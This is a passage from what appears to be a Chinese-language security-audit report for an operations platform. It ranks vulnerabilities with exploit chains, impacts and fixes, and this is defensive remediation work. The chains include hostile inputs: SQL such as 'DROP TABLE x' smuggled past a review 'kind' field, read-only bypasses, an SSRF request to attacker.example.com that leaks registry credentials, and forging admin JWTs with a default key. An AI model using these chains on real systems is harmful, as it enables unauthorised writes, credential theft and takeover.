- **影响面**：所有 Secret（DB 密码、镜像仓库凭据、TLS 私钥、SA token）对 viewer 可见 → 凭据泄露 + 横向到外部系统。
- **修复优先级：72h**。Secret 读取单独鉴权 + 按次审计；默认脱敏视图（key+长度），明文需一次性授权。

### P0-K　数据库审核 kind 自填绕过（DB-01）
- **前置条件**：`operator` 可建审核单；kind 取自请求体（只校验枚举）。
- **利用链**：提交 `{kind:"query", action:"sql", sql:"delete from t"}` 或 `{kind:"query", action:"import", sql:"DROP TABLE x"}` → 策略按 query 判定（默认无需审核）→ 执行时 query/import 路径真实 autocommit 提交。
- **影响面**：绕过 need_write/need_ddl 策略对生产库执行任意 DML/DDL；与 DB-02 组合单人闭环。
- **修复优先级：72h**。kind 一律服务端 classify 推导，忽略客户端传值；action 与 kind 强绑定；query 路径禁写语句。

### P0-L　数据库自审自批（DB-02）
- **前置条件**：项目 manager（通常兼 operator）自己提单。
- **利用链**：`POST /db-approvals`（requested_by=自己）→ `POST /{id}/approve`（同一人）→ immediate 执行。
- **影响面**：审核形同自证，P0 写操作失去第二人复核；合规审计无法成立。
- **修复优先级：72h**。approve/reject 强制 `requested_by != 当前用户`；记录 approver≠requester 校验结果。

### P0-M　数据库只读首词白名单绕过（DB-03）
- **前置条件**：任意有 read 权限用户；只读入口仅取首词比对白名单。
- **利用链**：`WITH ... DELETE`、`SELECT ... INTO OUTFILE`、`SELECT ... FOR UPDATE`、`EXPLAIN ANALYZE`（PG 真实执行）→ `dialect.query` `cur.execute` + autocommit=True。
- **影响面**：读权限用户对生产库写/锁/落盘副作用（删数据、行锁阻塞业务、DB 主机留文件）。
- **修复优先级：72h**。数据库级只读（`SET SESSION TRANSACTION READ ONLY`）+ 语句解析（禁 OUTFILE/FOR UPDATE/CALL/EXPLAIN ANALYZE）+ 未配只读账号拒绝入口（关联 DB-04）。

### P0-N　审批加签/转办自升级（APP-01）
- **前置条件**：`operator` 角色即可调 add-approver/transfer（不校验是否本单审批人/管理员）。
- **利用链**：`POST /approvals/{id}/add-approver`（加自己）→ `/decide` approve → `_check_approver_permission` 通过 → execute。
- **影响面**：任意 operator 批准任意高风险变更（含生产回滚/删除），审批机制形同虚设。
- **修复优先级：72h**。加签/转办要求调用者 ∈ approvers 或 admin；转办目标不得为本人；写审计。

### P0-O　registry SSRF + 仓库凭据外泄（SEC-01）
- **前置条件**：任意登录用户（require_any_user）；`image` 参数完全可控。
- **利用链**：`GET registry/tags?image=attacker.example.com/x` → `_resolve_creds` 匹配失败回退全局账号 → `httpx GET https://attacker.example.com/...` 带 Basic 认证头（凭据落对方 access log）；`_fetch_token` 还把 creds 发往 401 响应里任意 `realm`。
- **影响面**：平台统一镜像仓库账号泄露（拉取全部私有镜像、推送恶意镜像）；半盲 SSRF 内网发现。
- **修复优先级：72h**。registry host 白名单；删除「全局回退」分支；realm 必须同域；接口加权限+审计。

### P0-P　默认 change-me 密钥（AUTH-02，条件性 P0）
- **前置条件**：按 install.sh 默认流程部署且运维不改 .env（`ensure_env` 直接 `cp .env.example .env`）。
- **利用链**：JWT_SECRET_KEY=change-me 公开 → 离线构造任意 sub/role 的 admin JWT；ENCRYPTION_KEY=change-me-... 同泄漏 → 解密全部 kubeconfig/DB 密码/SSH 私钥。
- **影响面**：平台完全接管。
- **修复优先级：24h**（配置层 fail-fast）。Settings 拒绝默认占位值/短密钥；install.sh 用 secrets 随机填充；.env.example 置空 + 注释。**注：本机现有 .env 为 64 字符，当前实例未受影响，风险面在新部署环境。**

### P0-Q　agent 接入令牌明文 + 匿名 install.yaml 劫持隧道（AGT-02）
- **前置条件**：集群内具备 pods/deployments 读权限者（能读 Deployment spec 的 `-token=` args）；install.yaml 接口不要求登录，只校验该 token。
- **利用链**：`get deploy -o yaml` 读到 `-token=<266 字符>` → `GET install.yaml?token=`（匿名）→ 现场签发 CA 客户端证书 + 私钥 → 用「token + 新证书」注册 → `_agents[cluster_id]` 被覆盖 → 接管整条隧道。
- **影响面**：隧道劫持（伪造读结果、吞掉/替换下发命令、截获全部下发内容）；真实 agent 被挤下线；平台数据可信度归零。
- **修复优先级：72h**。token 改 Secret 挂载（`valueFrom.secretKeyRef`）；注册校验证书 CN/SAN 的 cluster_id 与 register 帧一致；install.yaml token 一次性 + 短 TTL；同 cluster 已有连接时新连接注册需二次确认/拒绝。

---

## 3. P1 排序（可利用性 × 影响）与修复批次

> P1 共 66 条，按「无需特殊网络位置、仅登录即可触达」优先，其余按影响面降序。给 4 个批次。

**批次 B1（第一周，随 P0 一起）：执行/凭据/认证直接放行类**
- AUTH-01 / SEC-04：内部令牌 = JWT 签名密钥（与 P0 密钥治理同源，须与 §5 一起做）
- K8S-07 / SEC-06 / ARCH-07：9099 日志流无鉴权 + heapdump 含凭据
- K8S-09：容器 exec 任意命令、无输出上限
- AGT-04：超时后不取消 agent 侧执行（破坏性操作「看不见地」执行完）
- EXE-06：custom-tasks 任意 shell（P0-E 的 P1 侧，同批修）
- AUTH-03：/ai/** 代理 viewer 可改 AI 配置/投毒知识库
- SEC-05：JWT 走 URL query + localStorage
- VM-01：update_host 凭据挪用 + 横向
- VM-02：SFTP 白名单含 /home 读私钥
- VM-03：危险命令拦截可被 shell 语法绕过

**批次 B2（1–3 周）：审批四眼/职责分离与隔离**
- APP-02（无申请人字段）、APP-03（双人可同一人）、APP-04（驳回后可重提）、APP-11（DB 自批）、PERM-07（DB 自批+不校验库授权）
- ISO-01（告警域无过滤）、ISO-02（namespace 空）、ISO-03/PERM-05（执行/回滚无归属）、ISO-04（DB 3 端点漏校验）、ISO-05（IDOR）、ISO-06（跨租户读 ES）、PERM-06（只读聚合无过滤）、K8S-08（告警/仪表盘跨租户）
- K8S-05（节点破坏性操作校验过宽）、K8S-10（集群级接口漏校验）、PERM-03（batch 任意 cluster_ids）、PERM-04（YAML namespace 鉴权/执行不一致，随 K8S-01 修复）
- EXE-07（回滚无审批）、EXE-08（auto 直接变更）、EXE-09（autonomy_gate 过宽）、EXE-10（mode=full 一键关审批）

**批次 B3（1–2 月）：执行可靠性、授权模型与审计**
- AGT-03（证书未绑定/吊销不回收）、AGT-06（agent/executor 零校验）、AGT-07（impersonation 未接线）、AGT-09（pull 明文）
- EXE-11（失败被吞仍 completed）、EXE-12（无指标直接关告警）、QUA-01（check-then-act 竞态）
- K8S-06（破坏性操作无审计）、DB-09（DB 审计哈希链缺失）、AGT-08（破坏性操作无审计）、DB-05/DB-06/DB-07/DB-10（备份/下载/DDL/定时外带）、DB-04/DB-08（只读回落/无超时）
- QUA-02（gRPC 无 deadline）、ARCH-04（alerts 双写者）

**批次 B4（2–3 月）：平台级可靠性与交付**
- ARCH-01/ARCH-02/ARCH-03（拓扑不一致/直连绕过/后台循环重复）、OPS-01（compose 日志流）
- AUTH-04/SEC-07（LDAP 绕过防爆破）、AGT-05（agent 串行无界队列）
- TST-01/TST-02/TST-03（核心链路/审计哈希/CI go test 缺失）、DEP-01（Go 版本漂移）、DEP-02（依赖漏声明）

---

## 4. P2/P3 聚合统计与主题聚类

**规模**：P2=102 条、P3=41 条，合计 143 条。不逐条抄写，按主题聚类如下：

| 主题 | 代表编号 | 数量（约） | 一句话 |
|---|---|---|---|
| 服务间/内部鉴权与密钥治理 | ARCH-09、TECH-02、PERM-13、K8S-16、VM-08、AGT-10 | 6 | 共享密钥、静态密钥、CA 明文——同一根因，随密钥治理批一并收敛 |
| Agent 协议与契约漂移 | ARCH-10/11、AGT-11/12/13、TECH-05 | 6 | 12+ 个 JSON 旁路方法不在 proto 契约，能力门禁缺失 |
| 审计完备性 | EXE-17/18/19、DB 系列、PERM-10、VM-05 | 8 | 审计字段不足/哈希链断裂/覆盖缺口（9% 写路由） |
| 多租户数据模型缺口 | ISO-07/08/09/10、DB-11~16 | 9 | project_id 未贯穿数据模型，全局对象无法归属 |
| 部署/运行时加固 | SEC-08、DEP-04/05/06、K8S-15、AGT-10 | 6 | root 运行、镜像浮动、无 securityContext |
| 依赖与供应链 | DEP-03/07/08/09/10/11/12/13、TECH-03 | 8 | CVE、版本分裂、无 digest/校验 |
| 代码质量/可维护性 | QUA-03~10、MOD-01/02/03 | 10 | 巨型文件、无契约、except 吞异常、零 rollback |
| 测试体系 | TST-04~10、MOD-04/05 | 7 | 覆盖率缺失、前端 0 测试、环境漂移 |
| 前端/交互 | QUA-14、DB-15/20、K8S-17、MOD-04 | 5 | 单文件过大、角色不隐藏入口 |
| 产品能力缺口 | VM-11、MOD-06、DB-17、K8S-13 | 4 | 服务/日志/文件管理、灰度发布未实现 |

> 说明：P2/P3 合计约占全部问题的 62%，绝大多数是「系统性缺陷的表象」，应在 P0/P1 根因修复后随批次自然收敛；不建议逐条零散修。

---

## 5. P0 修复顺序建议（先修哪 3 条 + 依赖关系）

**核心原则：先建「钥匙」再换「锁」，先堵「物理直连」再收「应用层授权」。**

**第 1 步（必须先做）：密钥治理 —— AUTH-02 + AUTH-01/SEC-04/ARCH-09/PERM-13/EXE-20/TECH-02**
- 为什么先做：后续所有「给 9090/9096/9100 上 token/mTLS」的改造，都必须先存在一套**独立、强、可轮换**的内部服务密钥体系。否则现在加 token 大概率又是复用 JWT_SECRET_KEY（治标不治本，正是 AUTH-01/ARCH-09 指出的现状）。同时 AUTH-02（change-me 默认密钥）是「零成本伪造 admin」的入口。
- 动作：①Settings fail-fast 拒绝占位/弱密钥；②引入独立 `INTERNAL_SERVICE_TOKEN`（或 mTLS CA），与 JWT 签名密钥彻底分离；③install.sh 随机填充。

**第 2 步（与第 1 步紧耦合，同 24h 窗口）：封死三条裸奔执行通道 —— EXE-03/SEC-02（9090）+ K8S-04/AGT-01/SEC-03（9096）+ EXE-05（9100）**
- 为什么紧跟：这三条是「绕过平台一切 RBAC/审批/审计」的物理直连通道，影响面=所有被管集群 cluster-admin，且攻击面在平台集群内部（任何被入侵的业务 Pod 都能打）。
- 动作：全部加第 1 步产出的独立 token/mTLS 拦截器；关 reflection；IssueClientCert 拆 admin-only；pull-token 强制非空；补 NetworkPolicy；compose 不发布 9090。

**第 3 步（可与第 2 步并行）：封堵应用层越权执行 —— EXE-02/PERM-01（MCP）+ PERM-02（custom-tasks）+ EXE-01（batch）**
- 为什么：这三条是「仅登录即可（甚至 viewer）执行写操作」的最高杠杆利用链，不依赖网络位置，是攻击者最可能实际利用的路径。
- 动作：统一走 `execute_tool` 门面 + `check_cluster_permission`；写类工具默认禁用；custom-tasks/batch 接入审批与授权。

**为什么不是先把「审批四眼」或「YAML namespace」做在最前**：它们确实是高危，但①审批四眼（APP-01/DB-02）依赖「先有统一审批判定点」才有意义，属 Action Gateway 改造（见 21/22 号）；②YAML namespace（K8S-01）与 DB 审核绕过（DB-01/02/03）在「未鉴权通道」仍开放时，攻击者根本不需要走这些受控接口——**先堵裸奔通道，才能让「接口级修复」有实际防御价值**。

---

## 6. 不修也必须知道的业务风险

1. **对外宣传与真实能力严重不符**：README 宣称「全链路审计可追溯」「经决策审批后自动执行」，但实测写操作审计覆盖率约 9%（PERM-10：25 个审计点 vs 285 个写路由），审批只覆盖 AI 计划链路（EXE-04），MCP/custom-tasks/batch/资源直改均无审批无审计。若以「安全合规平台」对外交付/过等保，此差距是**可被证伪的合规性缺陷**，建议在修复前对外措辞降级为「Beta/内部工具」。
2. **「云原生 RBAC 已接入」名不副实**（K8S-11/AGT-07）：impersonation 未接运行链，实际以 cluster-admin SA 执行 + 应用层自判。对外宣称「基于 K8s 原生 RBAC 最小权限」会误导客户的安全评估。
3. **默认部署即高危**（AUTH-02）：install.sh 默认流程会生成 change-me 密钥的环境，等于「装完即被接管」。任何新部署的客户环境在未改密钥前都处于公开可入侵状态。
4. **多租户隔离是「承诺级」而非「实现级」**（ISO-09）：全局对象（告警策略/静默/知识库/主机组）无法归属 project，告警域、审批列表、统计、AI 日志检索均无项目过滤。作为「多租户 SaaS」交付时，跨租户泄露是必然而非偶然。
5. **凭据治理全局薄弱**：kubeconfig/DB 密码/SSH 私钥/镜像仓库凭据全部依赖单把静态密钥（ENCRYPTION_KEY）或全局账号回退，无 KMS、无轮换、无 host 白名单。单一密钥泄露 = 全量纳管凭据解密（K8S-16/VM-08/SEC-01）。
6. **Agent 隧道信任模型可被单点破坏**：CA 私钥明文落共享卷（AGT-10）、证书不与集群绑定（AGT-03）、接入令牌明文进 Deployment args（AGT-02），任一条被利用即可劫持/冒充隧道，导致「平台看到的数据」与「真实集群状态」不可信。

---

*本文档所有结论可回溯到 01~17 号报告原文编号，未引入任何新问题。*
